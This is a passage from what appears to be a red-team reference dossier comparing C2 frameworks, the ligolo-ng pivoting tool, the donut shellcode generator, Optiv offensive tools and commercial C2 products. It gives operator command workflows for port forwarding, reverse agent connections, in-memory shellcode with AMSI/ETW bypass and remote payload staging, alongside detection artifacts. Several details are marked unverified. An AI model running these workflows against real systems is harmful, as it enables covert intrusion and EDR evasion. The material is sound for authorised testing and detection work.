# C2, Tunneling, and Post-Ex Filtering

> Source-read via gh. Repos 2026-11-06: BishopFox/sliver (12,243★ GPL-3.0), HavocFramework/Havoc (8,501★ GPL-3.0), its-a-feature/Mythic (4,896★ Other), nicocha30/ligolo-ng (5,163★ GPL-3.0), TheWover/donut (4,749★ BSD-3). Optiv: 47 repos. Commercial: cobaltstrike.com, bruteratel.com. OST: outflank.nl/ost/ (thin).

use <sessionID>
whoami / getprivs / getpid / getuid / getgid
execute-assembly <dll>        # .NET via implant shell
msf-inject <pid> <msf binary> # optional Metasploit pivot
migrate / spawn / sideload
pivots start <socks5/port>
portfwd add -lAddr 127.0.0.1:3389 -fAddr 192.0.2.1:3389   # local forward
rportfwd add -lAddr 127.0.0.1:8080 -fAddr 192.0.2.1:8080  # remote forward
```
Beacon mode: `generate --beacon` (separate path `generate-beacon.go`, `beacons/` pkg); switch session↔beacon requires rebuild — UNVERIFIED if dynamic flip supported.

### Pivoting/redirector model
TCP pivots + named-pipe C2 baked into implant (`--named-pipe`, `--tcp-pivot`); SOCKS5 proxy (`socks/`); port-forward both directions (`portfwd`/`rportfwd`); HTTP C2 profiles (`c2profiles/`, `GetHTTPC2Profiles` in `helpers.go:205-219`). Redirector = TLS-terminating proxy in front of HTTPS listener — content UNVERIFIED (no redirector pkg in `client/command/` listing; likely wiki/docs-side).

### OPSEC & malleable profile knobs
`--canary` domains, `--limit-*` environment gating (domain-joined/hostname/username/locale/file-exists) `generate.go:364-369`, `--template`, `--evasion`, `-march`/`netgo`/`skip-symbols`, HTTP C2 profiles, traffic-encoders, shellcode-encoders + shikata. Sleep/poll knobs from `generate.go:67-71`.

### Detection artifacts
Go implant = large static binary (~MB), `Sliver Implant Framework` strings in binary unless symbol-obfuscated (`span skip-symbols` impl), fixed listener ports 53/80/443/8888/1337/9898 when defaulted, gRPC/ protobuf fingerprint, named-pipe pivots — all port-based.

### Licensing
GPL-3.0 (gh licenseInfo). Teamserver closed? No — same repo; no per-seat.

---

## 2. HavocFramework/Havoc — Havoc Framework (Demon)

**Metadata:** `HavocFramework/Havoc` — "The Havoc Framework" (gh) — teamserver (Go) + client (C++/Qt) + Demon agent (Windows-first).

### What it is
Three-piece: teamserver (`teamserver/`, Go), operator client (`client/`, C++/Qt + Python API), Demon implant (C, `payloads/Demon`). Demon C2 over HTTP(S)/SMB pipes/External channels.

### Architecture
- **Ports:** Teamserver default 40056 (`profiles/havoc.yaotl:2-3` `Port = 40056`); listener `PortBind`/`PortConn` (HTTP example 443 both, `http_smb.yaotl:39-40`).
- **Profiles:** HCL ("yaotl" prefix — `teamserver/pkg/profile/yaotl/hclsimple`): `Teamserver{Host,Port,Build{Compiler64/86,Nasm}}`, `Operators{user}`, `Service{Endpoint,Password}`, `Demon{Sleep,Jitter,TrustXForwardedFor,Injection{Spawn64/32}}` — `profiles/havoc.yaotl:1-35`; `teamserver/pkg/profile/config.go:9-46` structs `HavocConfig{Server,Operators,Listener,Demon,Service,WebHook}`, `Listeners{Http,Smb,External}` (`config.go:30-34`), `ListenerHTTP` knobs (`config.go:36-80`): Hosts, HostBind, HostRotation, PortBind, PortConn, Method, UserAgent, Headers, Uris, Secure, Cert, Response{Headers}, Proxy{Host,Port,Username,Password}.
- **Magic value (wire):** `DEMON_MAGIC_VALUE = 0xDEADBEEF` — `teamserver/pkg/agent/commands.go:3-5`; 30 MB max pipe write — `commands.go:7-15`.
- **CLI:** `havoc teamserver --profile <file> [--debug|--debug-dev|--send-logs|--default|-v]` — `teamserver/cmd/cmd.go:26-38`; `VersionNumber="0.7" Bites The Dust` — `cmd.go:11-12`.

### Install
From `teamserver/Install.sh`, `Teamserver-Dockerfile`, `makefile` (top-level `makefile` builds client+teamserver+payloads). Steps UNVERIFIED in-detail this pass (installScriptNotFetched); use unmodified documented flow with Go + Qt for client.

### Command surface (real, file:line)
`teamserver/pkg/agent/commands.go:29-56` implant command IDs:
`COMMAND_CHECKIN=100`, `PROC=0x1010`, `FS=15`, `INLINEEXECUTE=20`, `ASSEMBLY_INLINE_EXECUTE=0x2001`, `INJECT_DLL=22`, `INJECT_SHELLCODE=24`, `SPAWNDLL=26`, `PROC_PPIDSPOOF=27`, `TOKEN=40`, `NET=2100`, `CONFIG=2500`, `SCREENSHOT=2510`, `PIVOT=2520`, `TRANSFER=2530`, `SOCKET=2540`, `KERBEROS=2550`, `MEM_FILE=2560`, `SLEEP=11`, `GET_JOB=1`, `INIT=99`. Config block `commands.go:90-105`: `CONFIG_IMPLANT_SLEEP_TECHNIQUE=5`, `INJECT_TECHNIQUE=150`, `SPOOFADDR=151`, `SPAWN64=152`, `SPAWN32=153`, `KILLDATE=154`, `WORKINGHOURS=155`. Client dispatch `client/src/Havoc/Demon/Commands.cc` (verified file exists; grep empty this pass). SMB handler: `teamserver/pkg/handlers/smb.go`; HTTP: `http.go`; External: `external.go`.

### Operator workflows
```
havoc teamserver --profile profiles/http_smb.yaotl
havoc client --profile client/config.toml   # Qt GUI
# HTTP listener (profiles/http_smb.yaotl:38-80): Teams-mimic Headers/Response blocks, Uris ["/Collector/2.0/settings/"], PortBind/Conn 443, Secure=false (audit only)
# Generate Demon → host → checkin (COMMAND_CHECKIN) → inline-execute / assembly-inline-execute → SMB pivot (PipeName="demon_pipe") → screenshot/kerberos ticket work
```

### Pivoting/redirector model
SMB pipes (`ListenerSMB PipeName`), External C2 (Endpoint), HTTP `Proxy` block (`config.go:73-78`); `PIVOT=2520`, `SOCKET=2540` commands. `HostRotation="round-robin"` (`http_smb.yaotl:38`).

### OPSEC & malleable profile knobs
Mimicry profiles carry full request/response Header sets + UserAgent Chrome/96 + fake `x-ms-session-id`/environment header — `http_smb.yaotl:41-64`; `KillDate`/`WorkingHours` (`config.go:38-41`, "8:00-17:00"), Demon `Sleep 2`/`Jitter 15` defaults (`havoc.yaotl:29-33`), Injection Spawn64/32 paths (Werfault, notepad). `TrustXForwardedFor` for redirector-on-CDN correctness.

### Detection artifacts
`0xDEADBEEF` magic header outbound frame, HTTP 443 unaspected `Secure=false` in samples → enable `Secure:true`, fixed port 40056 default, Yaotl Teams profile in repo not for production, Demon 30 MB pipe chunk patterns, .NET pipe template (`GetDotNetPipeTemplate` interface — `types.go:55`).

### Licensing
GPL-3.0 (gh). No seat cost. Client CommandSurface grep limitation: `Commands.cc` content grep returned empty — table above is server-side (authoritative wire IDs) not client autocomplete.

---

## 3. its-a-feature/Mythic — Mythic

**Metadata:** `its-a-feature/Mythic` — "A collaborative, multi-platform, red teaming framework" (gh) — docker-compose stack (Go server + React UI + Hasura + RabbitMQ + Postgres).

### What it is
Modular C2 platform separating **Payload Types** (agent impls) from **C2 Profiles** (transport) and core server/web UI. Collaboration-first: operations, operators, tasking console, reports — not just agent shells.

### Architecture
- **Containers:** `mythic-docker/`, `MythicReactUI/`, `Mythic_CLI/`, plus separate `hasura-docker/` `rabbitmq-docker/` `postgres-docker/` `nginx-docker/` `prometheus-docker/` `grafana-docker/` (root listing). Server entry: `mythic-docker/src/main.go:1-39` init order utils→logging→database→webserver→rabbitmq→StartServer. Server Dockerfile healthcheck `127.0.0.1:${MYTHIC_SERVER_PORT:-17443}/health` — `mythic-docker/Dockerfile:10-15` (base port **17443**).
- **GraphQL "schema":** Mythic does **not** expose a monolithic public GraphQL schema in this checkout. Runtime GraphQL is **Hasura over Postgres** consumed via webhooks: `r.POST("/graphql/webhook", webcontroller.GetHasuraClaims)` — `mythic-docker/src/webserver/initialize.go:196-197`. Agent transport: `/api/v1.4/agent_message` POST+GET and legacy `/agent_message` — `initialize.go:145-148`, openly reachable even unauthenticated ("allowed to come from anywhere…" :144-147). Auth/OIDC routes `:155-165` (`/auth`, `/invite`), API token ops `:201-205` (`generate_apitoken_webhook`), file download/upload `direct/download/:file_uuid` etc. `:168-186`.

### Install
```bash
sudo make            # from main Mythic dir (README)
sudo ./mythic-cli start        # bring up containers
./mythic-cli update            # check updates ([-b branch])
./mythic-cli install github https://github.com/MythicAgents/apfell     # install agent
./mythic-cli install github https://github.com/MythicC2Profiles/http # install C2 profile
```
(README verbatim pattern.) CLI is cobra: `Mythic_CLI/src/cmd/rootCmd.go:16-23` (`Use:"mythic-cli"`, config in `config.Initialize()` :30-31); subcmds from `cmd/` listing (67 files) incl. `config.go`, `install.go`, `installGitHub`, `health.go`, `start.go`, `services` = `list.go:10-16` "List out installed services". Docs site `https://mythicmeta.github.io/overview` is source-of-truth for payload/c2 catalog.

### Command surface (real, file:line)
- API routes enumerated above (`initialize.go:144-205`) + controllers dir `mythic-docker/src/webserver/controllers/` (webhooks incl. `add_attack_to_task_webhook.go`, `c2profile_*` : list `controllers/` first items).
- UI pages: `MythicReactUI/src/components/pages/Callbacks/CallbacksTabsTasking.js`, `...Console.js`, `...TaskingFilterDialog.js` — task console + **filtering built into UI** (Dialog file name proves it).
- Payload build UI: `CreatePayload/Step1..Step5` (`SelectOS`, `SelectPayloadType`, `SelectCommands`, `C2Profiles`, `Build`) + `CreatePayloadBuildParametersTable.js` / `CreatePayloadC2ProfileParametersTable.js` — build-params schema authored per payload/c2 in their own repos.

### Operator workflows
```
mythic-cli start → mythic-cli services (list.go)
mythic-cli install github <agent>   # e.g. MythicAgents/apfell
mythic-cli install github <c2profile>
# UI: Create Payload wizard (OS → Type → Commands → C2 → Build) → callback → Callbacks→Tasking Console → filter → task → collect file → Attack/Report → API token (webhook /generate_apitoken_webhook)
```

### Pivoting/redirector model
C2 profiles handle transport incl. HTTP/SMB/TCP pivots per profile repo; core routes any agent on `/agent_message` behind nginx-docker — redirector support = profile-defined. Mythic-side transport evidence here is only the `/agent_message` endpoint + `c2profile_*` webhooks; profile-internal pivot models UNVERIFIED in this pass.

### OPSEC & malleable profile knobs
Profiles (`C2Profile*` dialogs incl. `C2ProfileBuildDialog`, `C2ProfileConfigDialog`, `RedirectRules` webhook `c2profile_redirect_rules_webhook.go`), payload build parameters (per-agent repo), sleep/jitter from agent params — knobs not enumerated here (agent repos external).

### Detection artifacts
17443 RPC port, `/api/v1.4/*` endpoint fingerprints, Hasura `/graphql/webhook`, RabbitMQ+Postgres docker artifacts, `mythic-server` binary name, agent `/agent_message` paths — defenders can hunt 17443 + `agent_message` XHR. Docker-compose footprint is heavyweight to hide.

### Licensing/commercial limits
"Other" licence (gh) — not GPL/Apache; commercial/closed-source payload agents exist. No seat model in core.

---

## 4. nicocha30/ligolo-ng — TUN-device tunneling/pivoting

**Metadata:** `nicocha30/ligolo-ng` — "An advanced, yet simple, tunneling/pivoting tool that uses a TUN interface" (gh) — Go proxy + agent.

### What it is
L3/L4 pivoting over a TUN interface (`pkg/proxy/netstack`, gVisor-style stack): proxy brings up a TUN, receives TCP/UDP from local route, tunnels via yamux-encrypted channel to agent, agent does connect/listen on far side. Not a C2 (no implant object model); paired with Sliver/Havoc/Mythic.

### Architecture
- **Ports/transport:** Proxy default `-laddr 0.0.0.0:11601` — `cmd/proxy/main.go:38`; yamux muxed mux over TLS (`pkg/controller/controller.go:9-12`, `coder/websocket` import for WS mode prefix `http(s)://` — `main.go:38` help text). Max in-flight 4096/connections — `pkg/proxy/proxy.go:29`, `main.go:57` `-max-inflight 4096`.
- **Packet model:** `pkg/protocol/packets.go:20-46`: `Envelope{Type uint8, Payload}`, `MessageInfoRequest/Reply`, `MessageConnectRequest/Response`, `MessageListenerRequest/Response`, `MessageListenerBindRequest/Response`, `MessageListenerSockRequest/Response`, `MessageAgentKillRequest` (`packets.go:25-42`); `TransportTCP/UDP`, `Networkv4/v6`. `InfoReplyPacket{Name, Interfaces []NetInterface, SessionID}` (`packets.go:66-70`).
- **Agent → relay:** `pkg/agent/relay.go` (file exists — relay semantics). **Proxy session:** `pkg/proxy/proxy.go:35-48` `HandleSession` builds `ConnPool(MaxConnectionHandler=4096)` + `netstack.SetConnPool`.

### Install
`Makefile` + `goreleaser` build; builds `cmd/proxy/main.go` (proxy) and `cmd/agent/main.go` (agent). Full build flags UNVERIFIED (fetched `Makefile` listing only); proxy binary name UNVERIFIED beyond source layout.

### Command surface (real, file:line)
**Proxy flags** `cmd/proxy/main.go:32-57`:
`-laddr 0.0.0.0:11601`, `-autocert`, `-selfcert`, `-certfile certs/cert.pem`, `-keyfile certs/key.pem`, `-allow-domains`, `-selfcert-domain ligolo`, `-selfcert-cache`, `-max-inflight 4096`, `-api-laddr` (default 127.0.0.1:8080), `-daemon`, `-config` YAML, `-history`, `-v`, `-version`. **Agent flags** `cmd/agent/main.go:52-64`:
`-connect domain:port`, `-bind ip:port`, `-ignore-cert` (:52 "dangerous, only for debug purposes"), `-accept-fingerprint <hex>` (:53), `-retry/-retry-delay 5` (:55-56), `-reconnect true/-reconnect-delay 20` (:57-58), `-reconnect-timeout 300` (:59, 5 min), `-proxy <http|socks>` (:60), `-ua` (:63, Chrome/103 default), `-v`. **Interactive layer** `cmd/proxy/app/app.go` grumble commands: `session` (:415), `certificate_fingerprint` (:463), `connect_agent --ip --ignore-cert --accept-fingerprint` (:480-488), `tunnel_start` (:541), `tunnel_list` (:579), `tunnel_stop` (:607), `ifconfig` (:638), `listener_list` (:680), `listener_stop` (:708), `listener_add` (:771), `kill` (:841).

### Operator workflows (end-to-end)
```
# 1) proxy
proxy -selfcert -selfcert-domain ligolo -laddr 0.0.0.0:11601
# 2) agent on pivot host
agent -connect 192.0.2.1:11601 -ignore-cert
# 3) proxy interactive:
session                     # pick relay agent (:415)
tunnel_start -tun ligolo0   # bring up TUN (UNVERIFIED exact flag name — verify `tunnel_start` flags at app.go:541)
ifconfig                    # route add, e.g. route via tun0 for 192.168.10.0/24
# 4) local service relay:
listener_add -lAddr 127.0.0.1:3389 -fAddr 192.168.10.10:3389   # exposes RDP locally
```
Exact TUN name/flag spelling at `app.go:541-620` not line-verified this pass — verify before use.

### Pivoting/redirector model
First-class pivot: TUN interfaces (`netinfo`, `netstack`), listener-based inbound bind via `MessageListenerBind` packets, chained via `connect_agent --ip` proxying (`app.go:480`). No built-in HTTPS redirector; sit it behind nginx/Cloudflare (see §10).

### OPSEC & malleable profile knobs
`-selfcert-domain`, `-selfcert-cache`, `-allow-domains`/autocert domains, `-ua` Chrome UA, `--retry`/`--reconnect` timing (20s×300s window), `accept-fingerprint` pinning as "legit" alternative to `-ignore-cert`.

### Detection artifacts
Port 11601 default, self-signed certs CN=ligolo (visible in handshake), TUN device creation on proxy host (defender sees `ligolo` iface), yamux muxing over TLS fingerprint, WS mode leaks `http(s)://` listener prefix.

### Licensing
GPL-3.0 (gh). Self-hosted — no seat.

---

## 5. TheWover/donut — in-memory .NET/PE shellcode generator

**Metadata:** `TheWover/donut` — "Generates x86, x64, or AMD64+x86 position-independent shellcode that loads .NET Assemblies, PE files, and other Windows payloads from memory" (gh) — C generator+loader, BSD-3.

### What it is
Converts an EXE/DLL/VBS/JS/.NET assembly into position-independent shellcode (PIC) that the host process calls and that executes the file **entirely in memory**. Not a C2 — paired with Sliver's `execute-assembly` / `execute-shellcode` (`client/command/exec/commands.go:65,100`) or stage-by-WAF-CTI trickle.

### Architecture
Single-file loader PIC + `DONUT_CONFIG` (generator meta) + `DONUT_MODULE` (payload blob) + `DONUT_INSTANCE` (loader state: import hashes, bypass state, GUIDs). Types in `include/donut.h`:
- Arch: `DONUT_ARCH_ANY=-1`, `X86=1`, `X64=2`, `X84=3` — `donut.h:107-110`.
- Module: `DONUT_MODULE_NET_DLL=1`, `NET_EXE=2`, `DLL=3`, `EXE=4`, `VBS=5`, `JS=6` — `donut.h:113-118`.
- Format: `1=BINARY,2=BASE64,3=C,4=RUBY,5=PYTHON,6=POWERSHELL,7=CSHARP,8=HEX,9=UUID` — `donut.h:121-129`.
- Compression: `1=NONE,2=APLIB,3=LZNT1,4=XPRESS` (`donut.h:132-135`; Xpress Huffman=5 in README table, assembler nuance UNVERIFIED in header).
- Entropy: `1=NONE,2=RANDOM,3=DEFAULT(random names + symmetric encryption)` — `donut.h:138-140`.
- Bypass: `1=NONE,2=ABORT,3=CONTINUE` (AMSI/WLDP/ETW) — `donut.h:151-153`; Exit: `1=EXIT_THREAD,2=EXIT_PROCESS,3=BLOCK` (`donut.h:142-144`); Headers: `1=OVERWRITE,2=KEEP` (`donut.h:156-157`).
- Structs: `DONUT_MODULE` — type/compress/runtime/domain/cls/method/args/unicode/sig/mac/zlen/len/data — `donut.h:210-227`; `DONUT_CONFIG` — arch/bypass/headers/compress/entropy/format/exit_opt/thread/input/output/runtime/domain/cls/method/args/unicode/decoy/server/auth/modname/mod_type/inst_type — `donut.h:418-485`; `DONUT_INSTANCE` — key/iv/api-hashes/exit_opt/entropy/oep/amsi-clr-wldp GUID + server/http_req + module union — `donut.h:249-416`.

### Install
`git clone https://github.com/TheWover/donut.git`; `nmake -f Makefile.msvc` (VS2019) or `make -f Makefile.mingw` or `make` on Linux (README §Build); `pip3 install donut-shellcode` for Python module (README). Output: `donut` CLI (+ `.so`/`.a`/`.dll` libs).

### Command surface (real, file:line)
Usage table in source `donut.c:usage()` (~L2144-2179) + README "Usage" table:
`-i,--input` / `-a,--arch (1=x86 2=amd64 3=x86+amd64)` / `-c,--class` / `-d,--domain` / `-m,--method` / `-p,--args` / `-r,--runtime` / `-o,--output` (default `loader.bin`) / `-f,--format` (1..8 per donut.h) / `-e,--entropy 1..3` / `-z,--compress 1..4` / `-b,--bypass 1..3` / `-k,--headers 1..2` / `-t,--thread` / `-w,--unicode` / `-x,--exit` / `-y,--fork` / `-s,--server` / `-n,--modname` / `-j,--decoy`. Validation callbacks `donut.c:1947` `validate_arch`, `:2016` `validate_entropy`, `validate_bypass/headers` ~L2110 — usage printed `donut.c:2135-2182`.

### Operator workflows (minimal beaconless .NET exec)
```bash
donut -i payload.dll -c Namespace.ClassName -m Main -p "arg1 arg2" -a 2 -o payload.bin
# = generate x64 PIC shellcode that: hosts CLR (mscoree CorBindToRuntime/CLRCreateInstance), new AppDomain, AppDomain.Load_3, invoke cls.method(args) — README §How It Works.
# Feed via: echo/paste into host process OR Sliver:
execute-shellcode payload.bin
```
No beacon/sleep in donut itself (sleep lives in C2 implant). Network staging optional: `-s https://user:pass@host/path` + `-n modname` (DONUT_INSTANCE_HTTP=2 in donut.h:145-147; HTTP GET into memory — no disk write). Bypass defaults `-b 3 -e 3 -k 1`.

### Pivoting/redirector model
N/A (stager payload). Lacks crypto headers? No — Chaskey symmetric encryption + aPLib/RtlCompressBuffer compression enable WAF-light staging (README §Introduction).

### OPSEC & malleable profile knobs
Entropy random names, AMSI/WLDP/ETW patching (loader modular bypass — README `How It Works`), PE-header overwriting/mimicking via `-k`/`-j decoy`, thread-vs-process injection `-t`, timing of host call by `[host process]` — jitter lives C2-side.

### Detection artifacts
PIC shellcode ~bytes-identical across runs for same build (Donut's aPLib/EroEntropy mitigates), memory-scanner hits for CLR hosts + AppDomain.Load, shellcode-driven ETW patching patterns, `loader.bin` default filename.

### Licensing
BSD-3-Clause `LICENSE`.

---

## 6. Optiv (whole org, 47 repos) — relevant C2/post-ex subset

**Metadata:** `gh api orgs/optiv/repos --paginate` → 47 repos. Full list — `gh api orgs/optiv/repos --paginate --jq '.[] | "\(.full_name)"' | wc -l` (=47). Dormant capture/pentest/scanner repos excluded below; security-relevant set read live via description/license fields.

| Repo | Lang (PUSH date) | Role in C2/post-ex/filtering |
|---|---|---|
| `optiv/ScareCrow` | Go, 2023-08-18 | Payload-creation framework, EDR-bypass oriented. License: null (UNVERIFIED). |
| `optiv/Dent` | Go, 2023-08-18, MIT | COM-bypass framework exploiting WDAPT sensors. |
| `optiv/Ivy` | Go, 2023-08-18 | VBA-macro in-memory shellcode loader (payload exec, no beacon). |
| `optiv/Freeze` / `optiv/Freeze.rs` | Go / Rust, 2023-08-18 | Payload-exit bypass via suspended process + direct syscalls. |
| `optiv/Mangle` | Go, 2023-08-18 | Manipulate compiled EXE/DLL to evade EDR (packing/forging layer akin donut `-z`). |
| `optiv/evilginx2` | GPL-3.0, 2021-03-22 | AiTM phishing prox for creds+session cookies (2FA bypass) — pairs with C2 browser-pivot (CS "Browser Pivoting"). |
| `optiv/Talon` | Go, 2023-08-18 | Kerberoast/LDAP password-guessing (post-ex cred attack). |
| `optiv/Go365` | Go, 2024-03-19 | O365 user-attack (phishing/exfil channel). |
| `optiv/airCross` | Go, 2022-07-19 | AirWatch MDM single-factor auth abuse. |
| `optiv/rustyIron` | Go, 2021-03-22 | Ivanti MobileIron MDM SFA/group enumeration. |
| `optiv/doppelganger` | C++, 2024-06-14, MIT | ESP32 RFID-reader firmware (physical exfil adjacent). |
| `optiv/netneedle` | C, 2016-06-24 | Network steganography control channel/chat (covert C2 ancestor). |
| `optiv/Registry-Recon` | 2022-06-06 | Aggressor script for CS AV/EDR recon (CS-specific). |

Remaining 34 repos (scanners/Burp plugins/crackmes/cloud/terraform/HIBP clients/move-on) intentionally unlisted line-by-line — org is not a C2 farm; its value in this dossier is **payload/filter-adjacent tooling**, not an authored C2. Verified counts: `gh api orgs/optiv/repos --paginate --jq '...sublist'`.

---

## 7. Cobalt Strike — reference (commercial)

**Source:** cobaltstrike.com (verified 2026-11-06). Current release tag: 4.13 (Beacon Interpreter, BOF-PE, LLVM Beacon, Docking GUI, streaming).

**Architecture (public-knowledge summary — UNVERIFIED from this page):** Beacon implant + Aggressor client + Team Server; listeners HTTP/SM B/DNS/TCP; ports restaraurant default 443/80/53. This page doesn't enumerate ports/protocols — mark UNVERIFIED beyond standard public docs. Confirmed from page: "post-exploitation agent and covert channels … Malleable C2 lets you change your network indicators" (homepage text), "shared sessions", "AI Lite?" — no: page says Collaboration, Reporting, Threat emulation.

**Command surface:** Post-ex via Agent Commands (documented CS docs side); Aggressor script console (public docs, not this page). Not line-cited here (blocked by paywall/soft-gate UNVERIFIED).

**Workflow:** UI → Attack Kits → listeners → Beacon payload → task → pivot (SMB/TCP) → collect.

**Pivoting/redirector:** "Browser Pivoting – Bypass two-factor authentication using a man-in-the-browser attack" (pricing-plans page verbatim for license contents — CS4.x); SMB/TCP pivots standard. Redirector = CS docs "Malleable C2 + Hosted Page" pattern (public docs).

**OPSEC/malleable knobs:** Malleable C2 HTTP/DNS profiles (Beacon jitter/sleep transforms, header/URI stamping, certificate TTL); External C2 Channels (page lists Slack/Discord/Teams on BRC4, **not** CS — attribute carefully; CS external C2 support UNVERIFIED).

**Detection artifacts:** Beacon Sleep+jitter regex in NetFlow 443/80/53; malleable-profile JSON fingerprints; Aggressor/Bof side-loads.

**Licensing:** Fortra bundle pricing **quote-only** — cobaltstrike.com/product/pricing-plans: "REQUEST A COBALT STRIKE QUOTE", tiles: "Click the tile below to request pricing" (no public price). Site includes "Community Kit" free resources (`pricing-plans` page: "browse the Community Kit") — note: community Aggressor scripts exist but **CS server source is proprietary**; the "community fork" note in task brief refers to open-source community forks of Aggressor scripts/kit ecosystem, not anyone's fork of CS server code. Bundle: CS + Core Impact + OST via Fortra discount (`bundles` page).

---

## 8. Brute Ratel C4 — reference (commercial)

**Source:** bruteratel.com/en/ (verified 2026-11-06). Agent = "Badger", commands via "Click Script".

**Architecture (vendor page verbatim items):** DNS-over-HTTPS channel (default alongside HTTPS; "provides usability of newly bought domains without the need of domain fronting or redirector"), External C2 channels over Slack/Discord/Microsoft Teams (via "External C2 Channels" section — pairs with CS Browser Pivoting concept), multiple pivot channels SMB/TCP/WMI/WinRM + "managing remote services over RPC", LDAP Sentinel GUI, MITRE graph, Click Script automation (C#/BOF/PowerShell/Reflective DLL in-memory exec).

**Evasion table (vendor-published, x64 x86 WoW64 matrix — `bruteratel.com` page):** Stack Frame Chaining (x64 only), Indirect Syscalls (x64+x86+WoW64), Hide Shellcode Sections, Sleeping Masking (x64), Unhook EDR Userland Hooks/DLLs (x64), Unhook DLL Load Notifications (x64), LoadLibrary Proxy for ETW evasion (x64), Thread Stack Encryption, Badger Heap Encryption, Masquerade Thread Stack Frame, Hardware Breakpoint AMSI/ETW (all), Reuse Virtual Memory ETW, Reuse Libraries from PEB, Secure Free Badger Heap (Volatility), Advanced Module Stomping with PEB Hooking, In-Memory PE and RDLL/BOF/Dotnet exec. (Present this as vendor claims — UNVERIFIED hands-on.)

**Workflows:** Listener → Badger → Click Script → pivot (SMB/TCP/WMI/WinRM) → LDAP Sentinel (SPN/group) → MITRE graph report. "Ldap Sentinel provides a rich GUI interface to query various ldap queries to the Domain or a Forest" (vendor).

**Pivoting/redirector model:** Multi-pivot list above; DNS-over-HTTPS stated as fronting-avoidance; redirectors not product-native (use external infra — §10).

**OPSEC/malleable knobs:** "Network Malleability" evasion capability; indirect syscalls switch WinAPI↔NTAPI↔Syscalls on-the-fly; syscall obfuscation set; anti-debug.

**Detection artifacts:** Badger beacon packets; vendor-public MITRE graph + BYO Click Script fingerprints; DNS-over-HTTPS query pattern (DoH-via-custom-resolver volume).

**Licensing (vendor pricing page `bruteratel.com/pricing/` verified):** Single-User License **3,250 USD/yr**, Multi-User 3,100 USD/yr (search snippet); page itself: 1-year-by-default, multi-year offered (email for exact pricing), **wire-transfer only**, badge verification (registered companies + official business email/domain + work-history check), **authorized pentest use only** — "Dark Vortex does not authorize … anything other than authorized penetration testing assessments … cancel the license and provide help to law enforcement." Public earlier pricing 2,500 USD (2023, Unit42). No community tier on page.

---

## 9. Outflank Security Tooling (OST) — reference (commercial)

**Source:** `https://www.outflank.nl/ost/` (verified 2026-11-06) — page says *"OST Delivery Model — … cloud deployment model … efficient release delivery, immediate implementation of updates … datasheet … schedule a live demonstration"* only. Fortra bundles CS + Core Impact + OST ("interoperable tools enhances each other" — `cobaltstrike.com/product/pricing-plans`).

**OST lookalike/COM-hijack technique (task asks):** Classification: ~ ~ ~ . The `outflank.nl/ost/` page fetched provides **no technique detail** (delivery-model marketing blurb only). UNVERIFIED against vendor page; approximate public knowledge: OST ships *stealthy* .NET C2 with COM-hijack and lookalike-domain capabilities. Treat as:

- COM hijack: persistence/execution via malicious COM registrations (HKCU CLSID/OpenWith) — file-level technique; OST-specific claims UNVERIFIED.
- Lookalike-domain infrastructure: pre-registered similarity domains for redirector-fronting; implementation UNVERIFIED.

Details must NOT be taken from this thin page; quote/datasheet gated behind demo request.

**Detection:** SaaS-delivered implant, cloud-update channel → update-request noise; COM registration persistence visibility (autoruns/HKCU writes).

**Licensing:** Fortra bundle quote-only; no list price on `outflank.nl/ost/` (UNVERIFIED — verify datasheet/pricing-plans).
